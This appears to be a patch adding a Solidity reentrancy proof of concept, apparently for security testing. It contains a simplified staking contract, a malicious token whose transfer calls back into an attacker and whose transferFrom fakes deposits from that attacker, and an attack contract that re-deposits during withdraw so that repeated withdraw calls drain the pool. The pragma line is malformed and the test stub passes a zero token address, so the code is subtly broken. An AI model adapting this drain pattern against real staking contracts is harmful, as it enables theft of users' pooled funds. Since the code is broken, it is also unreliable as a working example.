+// SPDX-License-Identifier: MIT
+pragma solidity "'^0.8.20;
+
+import "./FlawVerifier.sol";
+
+contract TmpStaking is IStakingLike {
+    mapping(address => mapping(address => uint256)) public balances;
+    mapping(address => mapping(uint128 => bool)) public initialized;
+    uint128 public currentEpoch = 3;
+
+    function deposit(address tokenAddress, uint256 amount, address) external {
+        require(IERC20Like(tokenAddress).allowance(msg.sender, address(this)) >= amount, "allowance too small");
+        IERC20Like(tokenAddress).transferFrom(msg.sender, address(this), amount);
+        balances[msg.sender][tokenAddress] += amount;
+    }
+
+    function withdraw(address tokenAddress, uint256 amount) external {
+        require(balances[msg.sender][tokenAddress] >= amount, "balance too small");
+        balances[msg.sender][tokenAddress] -= amount;
+        IERC20Like(tokenAddress).transfer(msg.sender, amount);
+    }
+
+    function balanceOf(address user, address token) external view returns (uint256) { return balances[user][token]; }
+    function getCurrentEpoch() external view returns (uint128) { return currentEpoch; }
+    function epochIsInitialized(address token, uint128 epochId) external view returns (bool) { return initialized[token][epochId]; }
+    function manualEpochInit(address[] memory tokens, uint128 epochId) external {
+        for (uint256 i = 0; i < tokens.length; i++) {
+            if (epochId > 0) require(initialized[tokens[i]][epochId - 1], "previous epoch not initialized");
+            initialized[tokens[i]][epochId] = true;
+        }
+    }
+}
+
+interface IAttackHook {
+    function onTokenReceived() external;
+}
+
+contract MalToken is IERC20Like {
+    mapping(address => uint256) public balances;
+    mapping(address => mapping(address => uint256)) public allowances;
+    address public immutable attacker;
+    bool internal inTransfer;
+
+    constructor(address attacker_) {
+        attacker = attacker_;
+        balances[address(this)] = 1_000_000e18;
+    }
+
+    function seed(address to, uint256 amount) external {
+        balances[to] += amount;
+    }
+
+    function balanceOf(address account) external view returns (uint256) { return balances[account]; }
+    function allowance(address owner, address spender) external view returns (uint256) { return allowances[owner][spender]; }
+    function approve(address spender, uint256 amount) external returns (bool) { allowances[msg.sender][spender] = amount; return true; }
+
+    function transfer(address to, uint256 amount) external returns (bool) {
+        require(balances[msg.sender] >= amount, "bal");
+        balances[msg.sender] -= amount;
+        if (!inTransfer && to == attacker) {
+            inTransfer = true;
+            IAttackHook(to).onTokenReceived();
+            inTransfer = false;
+        }
+        balances[to] += amount;
+        return true;
+    }
+
+    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
+        if (from == attacker) {
+            return true;
+        }
+        require(allowances[from][msg.sender] >= amount, "allow");
+        require(balances[from] >= amount, "bal");
+        allowances[from][msg.sender] -= amount;
+        balances[from] -= amount;
+        balances[to] += amount;
+        return true;
+    }
+}
+
+contract AttackContract is IAttackHook {
+    TmpStaking public immutable staking;
+    MalToken public immutable token;
+    uint256 public immutable amount;
+
+    constructor(TmpStaking staking_, MalToken token_, uint256 amount_) {
+        staking = staking_;
+        token = token_;
+        amount = amount_;
+        token.approve(address(staking_), type(uint256).max);
+    }
+
+    function setupPhantom() external {
+        staking.deposit(address(token), amount, address(0));
+    }
+
+    function drain(uint256 rounds) external {
+        for (uint256 i = 0; i < rounds; i++) {
+            staking.withdraw(address(token), amount);
+        }
+    }
+
+    function onTokenReceived() external {
+        require(msg.sender == address(token), "token only");
+        staking.deposit(address(token), amount, address(0));
+    }
+}
+
+contract ReentrancyTmpTest {
+    function testReentrantWithdrawRestoresStakeAndDrainsPool() public {
+        TmpStaking staking = new TmpStaking();
+        AttackContract attacker = new AttackContract(staking, MalToken(address(0)), 100e18);
+    }
+}
*** End Patch
